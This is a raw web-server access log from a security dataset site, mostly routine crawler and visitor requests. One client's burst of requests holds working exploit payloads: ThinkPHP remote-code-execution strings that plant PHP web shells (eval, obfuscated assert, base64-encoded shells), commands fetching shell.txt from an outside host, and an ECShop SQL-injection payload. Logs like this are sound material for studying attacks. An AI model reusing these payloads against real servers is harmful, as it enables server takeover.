47.105.170.18 - - [07/Mar/2020:02:10:12 -0800] "GET /js/comm.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
129.205.113.144 - - [07/Mar/2020:04:48:16 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
129.205.113.144 - - [07/Mar/2020:04:48:17 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
129.205.113.144 - - [07/Mar/2020:04:48:19 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" 
54.208.102.37 - - [07/Mar/2020:04:48:30 -0800] "GET / HTTP/1.1" 200 12776 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
54.208.102.37 - - [07/Mar/2020:04:48:30 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
123.192.80.215 - - [07/Mar/2020:05:01:09 -0800] "GET / HTTP/1.1" 200 12777 "https://buzzorange.com/techorange/2017/01/23/cyber-security-and-deep-learning-resources/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
123.192.80.215 - - [07/Mar/2020:05:01:09 -0800] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
123.192.80.215 - - [07/Mar/2020:05:01:09 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
123.192.80.215 - - [07/Mar/2020:05:01:09 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
123.192.80.215 - - [07/Mar/2020:05:01:12 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
157.55.39.155 - - [07/Mar/2020:05:08:18 -0800] "GET /self.logs/error.log.2018-09-28.gz HTTP/1.1" 200 4510 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.119 - - [07/Mar/2020:05:25:41 -0800] "GET /self.logs/error.log.2019-02-22.gz HTTP/1.1" 200 4211 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.155 - - [07/Mar/2020:05:34:56 -0800] "GET /self.logs/access.log.2018-09-17.gz HTTP/1.1" 200 30840 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
45.147.252.191 - - [07/Mar/2020:05:36:06 -0800] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 301 514 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:07 -0800] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 3968 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:28 -0800] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 301 512 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:29 -0800] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 5442 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:40 -0800] "GET /Datasets%20Description/Network/files.html HTTP/1.1" 301 516 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:41 -0800] "GET /Datasets%20Description/Network/files.html HTTP/1.1" 200 5054 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:52 -0800] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 301 512 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:53 -0800] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 200 4910 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:58 -0800] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 301 514 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:36:59 -0800] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 5924 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:17 -0800] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 301 518 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:17 -0800] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 200 5375 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:28 -0800] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 301 526 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:29 -0800] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 291 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:34 -0800] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 301 514 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:34 -0800] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 200 5792 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:41 -0800] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 301 512 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:41 -0800] "GET /Datasets%20Description/Network/ssh.html HTTP/1.1" 200 3915 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:46 -0800] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 301 512 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:46 -0800] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 5072 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:49 -0800] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 301 518 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:49 -0800] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 200 3787 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:58 -0800] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 301 516 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:37:58 -0800] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 4312 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:03 -0800] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 508 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:03 -0800] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 582 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:04 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 1904 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:11 -0800] "GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1" 301 508 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:11 -0800] "GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1" 301 582 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:11 -0800] "GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1" 200 1904 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:30 -0800] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 508 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:30 -0800] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 582 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:30 -0800] "GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1" 200 1826 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:41 -0800] "GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1" 301 520 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:42 -0800] "GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1" 200 4613 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:57 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 301 532 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:58 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 4631 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:38:59 -0800] "GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1" 301 530 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:39:00 -0800] "GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1" 200 4246 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:39:09 -0800] "GET /self.logs/ HTTP/1.1" 301 458 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:39:10 -0800] "GET /self.logs/ HTTP/1.1" 200 213040 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
49.70.12.79 - - [07/Mar/2020:05:39:17 -0800] "GET /dede/login.php HTTP/1.1" 404 328 "-" "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)" 
45.147.252.191 - - [07/Mar/2020:05:39:32 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 500 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
45.147.252.191 - - [07/Mar/2020:05:39:32 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930884 "-" "7Siters/1.08 (+https://7ooo.ru/siters/)" 
157.55.39.119 - - [07/Mar/2020:05:41:15 -0800] "GET /self.logs/access.log.2018-10-28.gz HTTP/1.1" 200 16151 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.89.253.9 - - [07/Mar/2020:05:47:27 -0800] "GET /type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss HTTP/1.1" 404 328 "http://www.secrepo.com/type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:47:31 -0800] "GET / HTTP/1.1" 200 12740 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0" 
49.89.253.9 - - [07/Mar/2020:05:47:33 -0800] "POST /plus/mytag_js.php?aid=9090 HTTP/1.1" 404 328 "http://www.secrepo.com/plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:47:33 -0800] "POST /plus/moon.php HTTP/1.1" 404 305 "http://www.secrepo.com/plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:47:33 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?> HTTP/1.1" 200 47579 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots1.php&content=xbshell<?php%20@eval($_POST[admin]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:47:40 -0800] "GET /robots1.php HTTP/1.1" 404 328 "http://www.secrepo.com/robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:47:41 -0800] "POST /robots1.php HTTP/1.1" 404 305 "http://www.secrepo.com/robots1.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:47:41 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" 200 47579 "http://www.secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20=\"axsxsxexrxt\";$poc_1%20=%20explode(\"x\",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:47:57 -0800] "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" 200 47602 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20\"xinba\";$ch%20=%20explode(\".\",\"hello.ass.world.er.t\");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:05 -0800] "GET /robots.php HTTP/1.1" 404 328 "http://www.secrepo.com/robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:05 -0800] "POST /robots.php HTTP/1.1" 404 305 "http://www.secrepo.com/robots.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:06 -0800] "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs)); HTTP/1.1" 200 47579 "http://www.secrepo.com/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET[%27fuck%27]);&fuck=fputs(fopen(base64_decode(eC5waHA),w),base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz54YnNoZWxs));" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:25 -0800] "GET /index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,eGJzaGVsbCUzQyUzRnBocCUwQSUyNHN0JTIwJTNEJTIwQGNyZWF0ZV9mdW5jdGlvbiUyOCUyNyUyNyUyQyUyMCUyNF9QT1NUJTVCJTI3aHhxOTkxMjE3JTI3JTVEJTI5JTNCJTBBJTI0c3QlMjglMjklM0I= HTTP/1.1" 404 328 "http://www.secrepo.com/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,eGJzaGVsbCUzQyUzRnBocCUwQSUyNHN0JTIwJTNEJTIwQGNyZWF0ZV9mdW5jdGlvbiUyOCUyNyUyNyUyQyUyMCUyNF9QT1NUJTVCJTI3aHhxOTkxMjE3JTI3JTVEJTI5JTNCJTBBJTI0c3QlMjglMjklM0I=" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:26 -0800] "GET /user.php?act=login HTTP/1.1" 404 305 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a325175634768774a79776e50443977614841675a585a686243676b58314250553152625a5630704f79412f506d4669597963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:26 -0800] "GET /SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest HTTP/1.1" 404 305 "http://www.secrepo.com/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:26 -0800] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 305 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:27 -0800] "POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:28 -0800] "POST /index.php?m=vod-search HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?m=vod-search" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:28 -0800] "GET /index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 404 877 "http://www.secrepo.com/index.php?s=index/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:28 -0800] "GET /index.php?s=Home/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 404 877 "http://www.secrepo.com/index.php?s=Home/\\\\think\\\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:29 -0800] "GET /index.php?s=index/\\\\think\\\\Container/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php HTTP/1.1" 404 877 "http://www.secrepo.com/index.php?s=index/\\\\think\\\\Container/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=http://www.520yxsf.com/shell.txt&vars[1][]=libsoft.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:29 -0800] "POST /index.php HTTP/1.1" 404 305 "http://www.secrepo.com/index.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:30 -0800] "POST /index.php?s=captcha HTTP/1.1" 404 305 "http://www.secrepo.com/index.php?s=captcha" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.89.253.9 - - [07/Mar/2020:05:48:30 -0800] "GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',file_get_contents('http://www.520yxsf.com/shell.txt'));</php> HTTP/1.1" 404 877 "http://www.secrepo.com/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',file_get_contents('http://www.520yxsf.com/shell.txt'));</php>" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
162.210.196.100 - - [07/Mar/2020:05:52:08 -0800] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.100 - - [07/Mar/2020:05:52:12 -0800] "GET / HTTP/1.1" 200 12733 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
129.204.161.135 - - [07/Mar/2020:06:11:04 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 54112 "HTTP://you85.com/gsk.swf" "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.0 Mobile Safari/537.36" 
120.243.180.124 - - [07/Mar/2020:06:10:21 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 78408 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36" 
94.237.121.129 - - [07/Mar/2020:06:11:59 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 7695688 "-" "Mozilla/5.0 (Linux; Android 10; Mi 10 Build/QKQ1.191117.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36" 
94.237.121.129 - - [07/Mar/2020:06:11:49 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 9692940 "-" "Mozilla/5.0 (Linux; Android 10; Mi 10 Build/QKQ1.191117.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36" 
120.204.17.71 - - [07/Mar/2020:06:12:03 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 163520 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0" 
94.237.121.129 - - [07/Mar/2020:06:11:58 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 9812660 "-" "Mozilla/5.0 (Linux; Android 10; Mi 10 Build/QKQ1.191117.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36" 
218.104.146.103 - - [07/Mar/2020:06:26:39 -0800] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
222.209.163.234 - - [07/Mar/2020:06:01:32 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4714400 "https://blog.csdn.net/answer3lin/article/details/82966360" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
58.250.125.75 - - [07/Mar/2020:06:33:26 -0800] "GET / HTTP/1.1" 301 438 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.250.125.75 - - [07/Mar/2020:06:33:36 -0800] "GET / HTTP/1.1" 200 12741 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
157.55.39.155 - - [07/Mar/2020:06:33:55 -0800] "GET /self.logs/access.log.2017-07-04.gz HTTP/1.1" 200 20214 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.21.88 - - [07/Mar/2020:06:34:37 -0800] "GET /css/style.css HTTP/1.1" 404 291 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)" 
58.250.125.185 - - [07/Mar/2020:06:34:38 -0800] "GET /css/style.css HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
111.202.100.82 - - [07/Mar/2020:06:34:38 -0800] "GET /css/style.css HTTP/1.1" 404 284 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.250.125.185 - - [07/Mar/2020:06:34:38 -0800] "GET /css/style.css HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
